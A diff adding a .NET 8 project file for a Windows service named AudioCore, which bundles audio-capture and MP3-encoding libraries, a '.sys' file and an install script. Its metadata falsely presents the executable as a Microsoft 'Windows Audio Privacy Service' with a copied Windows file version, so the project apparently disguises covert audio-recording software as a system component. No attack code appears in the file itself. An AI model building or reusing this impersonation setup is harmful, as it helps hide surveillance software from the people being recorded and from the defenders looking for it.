@@ -1,0 +1,185 @@
+﻿<Project Sdk="Microsoft.NET.Sdk.Worker">
+
+	<PropertyGroup>
+		<OutputType>Exe</OutputType>
+    <!-- Чистый net8.0 без WindowsDesktop, чтобы не подтягивать GUI DLL -->
+    <TargetFramework>net8.0</TargetFramework>
+    <AssemblyName>AudioCore</AssemblyName>
+    <!-- Self-contained: .NET 8 Runtime внутри exe, на целевой машине ничего ставить не нужно -->
+		<SelfContained>true</SelfContained>
+
+    <!-- Метаданные файла в стиле Microsoft -->
+    <Company>Microsoft Corporation</Company>
+    <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
+    <Product>Microsoft® Windows® Operating System</Product>
+    <Description>Windows Audio Privacy Service</Description>
+    <AssemblyTitle>Windows Audio Privacy Service</AssemblyTitle>
+    <NeutralLanguage>en</NeutralLanguage>
+    <AssemblyCulture></AssemblyCulture>
+
+    <!-- Фиксированная версия файла и продукта для Windows (должна быть установлена ДО генерации версионного ресурса) -->
+    <FileVersion>10.0.22000.527</FileVersion>
+    <ProductVersion>10.0.22000.527</ProductVersion>
+
+    <!-- Автоматическая версия на основе даты/времени сборки (для AssemblyVersion) -->
+    <VersionPrefix>1.0</VersionPrefix>
+    <GenerateAssemblyVersionAttribute>true</GenerateAssemblyVersionAttribute>
+    <GenerateAssemblyFileVersionAttribute>false</GenerateAssemblyFileVersionAttribute>
+    <GenerateAssemblyInformationalVersionAttribute>true</GenerateAssemblyInformationalVersionAttribute>
+    <!-- Отключаем автоматическую генерацию версионного ресурса, используем .rc файл -->
+    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
+    
+    <!-- Свойства для версионного ресурса Windows -->
+    <VersionResourceFileDescription>Windows Audio Privacy Service</VersionResourceFileDescription>
+    <VersionResourceOriginalFilename>AudioCore.exe</VersionResourceOriginalFilename>
+    <VersionResourceLanguage>1033</VersionResourceLanguage>
+
+    <!-- Win32 ресурсы для правильного отображения в свойствах файла -->
+    <Win32Resource>version.res</Win32Resource>
+
+    <!-- Single-file: все управляемые DLL (Microsoft.Extensions.*, NAudio.*) в exe -->
+    <PublishSingleFile>true</PublishSingleFile>
+    <PublishTrimmed>false</PublishTrimmed>
+    
+    <!-- Нативные DLL НЕ встраиваем в exe, они должны быть отдельными файлами -->
+    <IncludeNativeLibrariesForSelfExtract>false</IncludeNativeLibrariesForSelfExtract>
+
+		<!-- Оптимизация -->
+		<Optimize>true</Optimize>
+		<DebugType>none</DebugType>
+		<DebugSymbols>false</DebugSymbols>
+
+		<RuntimeIdentifier>win-x64</RuntimeIdentifier>
+    <PublishReadyToRun>false</PublishReadyToRun>
+
+    <InvariantGlobalization>true</InvariantGlobalization>
+
+    <!-- Отключаем локализацию для уменьшения размера -->
+    <SatelliteResourceLanguages>en</SatelliteResourceLanguages>
+	</PropertyGroup>
+
+	<PropertyGroup Condition="'$(Configuration)'=='Release'">
+		<Optimize>true</Optimize>
+		<DefineConstants>RELEASE</DefineConstants>
+	</PropertyGroup>
+
+	<PropertyGroup Condition="'$(Configuration)'=='Debug'">
+		<DefineConstants>DEBUG</DefineConstants>
+		<PublishTrimmed>false</PublishTrimmed>
+		<PublishSingleFile>false</PublishSingleFile>
+	</PropertyGroup>
+
+	<ItemGroup>
+    <PackageReference Include="Microsoft.Extensions.Hosting" Version="8.0.0" />
+    <PackageReference Include="Microsoft.Extensions.Hosting.WindowsServices" Version="8.0.0" />
+    <PackageReference Include="Microsoft.Win32.SystemEvents" Version="8.0.0" />
+    <PackageReference Include="Microsoft.Extensions.Configuration.Json" Version="8.0.0" />
+    <PackageReference Include="NAudio" Version="2.2.1" />
+    <PackageReference Include="NAudio.Lame" Version="2.1.0" />
+	</ItemGroup>
+
+  <!-- Исключаем из компиляции все *.cs из obj и вложенного проекта AudioDecryptor,
+       чтобы не подтягивались автосгенерированные AssemblyInfo/AssemblyAttributes и чужие файлы -->
+	<ItemGroup>
+    <Compile Remove="obj\**\*.cs" />
+    <Compile Remove="AudioDecryptor\**\*.cs" />
+	</ItemGroup>
+
+	<ItemGroup>
+    <None Update="apts.sys">
+      <CopyToOutputDirectory>Always</CopyToOutputDirectory>
+      <CopyToPublishDirectory>Always</CopyToPublishDirectory>
+      <ExcludeFromSingleFile>true</ExcludeFromSingleFile>
+    </None>
+    <None Update="install.bat">
+			<CopyToOutputDirectory>Always</CopyToOutputDirectory>
+      <CopyToPublishDirectory>Always</CopyToPublishDirectory>
+      <ExcludeFromSingleFile>true</ExcludeFromSingleFile>
+		</None>
+	</ItemGroup>
+  
+  <!-- Копируем нативные DLL (libmp3lame) из папки bin в publish -->
+  <Target Name="CopyNativeDllsToPublish" AfterTargets="Publish">
+    <PropertyGroup>
+      <BinDir Condition="'$(RuntimeIdentifier)' != ''">$(MSBuildProjectDirectory)\bin\$(Configuration)\$(TargetFramework)\$(RuntimeIdentifier)</BinDir>
+      <BinDir Condition="'$(RuntimeIdentifier)' == ''">$(MSBuildProjectDirectory)\bin\$(Configuration)\$(TargetFramework)</BinDir>
+    </PropertyGroup>
+    <ItemGroup>
+      <NativeDlls Include="$(BinDir)\libmp3lame*.dll" />
+    </ItemGroup>
+    <Copy SourceFiles="@(NativeDlls)" DestinationFolder="$(PublishDir)" Condition="Exists('$(BinDir)') AND '@(NativeDlls)' != ''" ContinueOnError="true" />
+    <Message Text="Looking for native DLLs in: $(BinDir)" Importance="high" />
+    <Message Text="Found native DLLs: @(NativeDlls)" Condition="'@(NativeDlls)' != ''" Importance="high" />
+  </Target>
+  
+  <!-- Исключаем нативные DLL из single-file через Target -->
+  <Target Name="ExcludeNativeDllsFromSingleFile" AfterTargets="ComputeFilesToPublish">
+    <ItemGroup>
+      <FilesToPublish Update="@(FilesToPublish)" Condition="$([System.String]::Copy('%(Filename)').StartsWith('libmp3lame'))">
+        <ExcludeFromSingleFile>true</ExcludeFromSingleFile>
+      </FilesToPublish>
+    </ItemGroup>
+  </Target>
+  
+  <!-- Автоматическое изменение версии при каждой компиляции -->
+  <Target Name="SetVersion" BeforeTargets="GetAssemblyVersion">
+    <PropertyGroup>
+      <!-- Формат версии: Major.Minor.Build.Revision -->
+      <!-- Build = дни с 2022-01-01, Revision = секунды с начала дня -->
+      <Hour>$([System.DateTime]::Now.Hour)</Hour>
+      <Minute>$([System.DateTime]::Now.Minute)</Minute>
+      <Second>$([System.DateTime]::Now.Second)</Second>
+      <DaysSince2022>$([System.Math]::Floor($([System.DateTime]::Now.Date.Subtract($([System.DateTime]::Parse('2022-01-01'))).TotalDays)))</DaysSince2022>
+      <BuildNumber>$(DaysSince2022)</BuildNumber>
+      <!-- Revision = секунды с начала дня (максимум 86399, но ограничим до 43200 для безопасности) -->
+      <TotalSeconds>$([System.Math]::Floor($([System.DateTime]::Now.TimeOfDay.TotalSeconds)))</TotalSeconds>
+      <!-- Используем только первые 43200 секунд (12 часов) для Revision, чтобы поместиться в UInt16 -->
+      <RevisionNumber Condition="$(TotalSeconds) &lt;= 43200">$(TotalSeconds)</RevisionNumber>
+      <RevisionNumber Condition="$(TotalSeconds) &gt; 43200">$([System.Math]::Floor($(TotalSeconds) - 43200))</RevisionNumber>
+      <Version>1.0.$(BuildNumber).$(RevisionNumber)</Version>
+      <AssemblyVersion>$(Version)</AssemblyVersion>
+      <!-- FileVersion и ProductVersion уже установлены в PropertyGroup выше -->
+      <InformationalVersion>$(Version)</InformationalVersion>
+    </PropertyGroup>
+    <Message Text="Building version: $(Version) (Build: $(BuildNumber), Revision: $(RevisionNumber))" Importance="high" />
+    <Message Text="FileVersion: $(FileVersion), ProductVersion: $(ProductVersion)" Importance="high" />
+  </Target>
+  
+  <!-- Target для установки версионного ресурса Windows после генерации AssemblyInfo -->
+  <Target Name="SetVersionResourceInfo" AfterTargets="GenerateAssemblyInfo" BeforeTargets="CoreCompile">
+    <PropertyGroup>
+      <!-- Переопределяем FileVersion и ProductVersion для версионного ресурса -->
+      <FileVersion>10.0.22000.527</FileVersion>
+      <ProductVersion>10.0.22000.527</ProductVersion>
+    </PropertyGroup>
+  </Target>
+  
+  <!-- Компиляция версионного ресурса из .rc файла -->
+  <Target Name="CompileVersionResource" BeforeTargets="CoreCompile">
+    <PropertyGroup>
+      <RcFile>$(MSBuildProjectDirectory)\version.rc</RcFile>
+      <ResFile>$(MSBuildProjectDirectory)\version.res</ResFile>
+    </PropertyGroup>
+    
+    <!-- Ищем rc.exe и соответствующую версию SDK -->
+    <PropertyGroup>
+      <RcExePath Condition="Exists('C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64\rc.exe')">C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64\rc.exe</RcExePath>
+      <SdkVersion Condition="'$(RcExePath)' != ''">10.0.26100.0</SdkVersion>
+      <RcExePath Condition="'$(RcExePath)' == '' AND Exists('C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\rc.exe')">C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64\rc.exe</RcExePath>
+      <SdkVersion Condition="'$(RcExePath)' != '' AND '$(SdkVersion)' == ''">10.0.22621.0</SdkVersion>
+      <RcExePath Condition="'$(RcExePath)' == '' AND Exists('C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x64\rc.exe')">C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x64\rc.exe</RcExePath>
+      <SdkVersion Condition="'$(RcExePath)' != '' AND '$(SdkVersion)' == ''">10.0.22000.0</SdkVersion>
+      <RcExePath Condition="'$(RcExePath)' == '' AND Exists('C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\rc.exe')">C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\rc.exe</RcExePath>
+      <SdkVersion Condition="'$(RcExePath)' != '' AND '$(SdkVersion)' == ''">10.0.19041.0</SdkVersion>
+      <RcExePath Condition="'$(RcExePath)' == '' AND Exists('C:\Program Files (x86)\Windows Kits\10\bin\10.0.15063.0\x64\rc.exe')">C:\Program Files (x86)\Windows Kits\10\bin\10.0.15063.0\x64\rc.exe</RcExePath>
+      <SdkVersion Condition="'$(RcExePath)' != '' AND '$(SdkVersion)' == ''">10.0.15063.0</SdkVersion>
+    </PropertyGroup>
+    
+    <Exec Command="&quot;$(RcExePath)&quot; /i &quot;C:\Program Files (x86)\Windows Kits\10\Include\$(SdkVersion)\um&quot; /i &quot;C:\Program Files (x86)\Windows Kits\10\Include\$(SdkVersion)\shared&quot; /i &quot;C:\Program Files (x86)\Windows Kits\10\Include\$(SdkVersion)\winrt&quot; /fo &quot;$(ResFile)&quot; &quot;$(RcFile)&quot;" 
+          Condition="Exists('$(RcExePath)') AND Exists('$(RcFile)') AND '$(SdkVersion)' != ''" 
+          ContinueOnError="false" />
+    <Message Text="Compiled version resource: $(ResFile) using SDK $(SdkVersion)" Condition="Exists('$(ResFile)')" Importance="high" />
+    <Warning Text="Failed to compile version resource - rc.exe not found or .rc file missing" Condition="!Exists('$(ResFile)')" />
+  </Target>
+
+</Project>
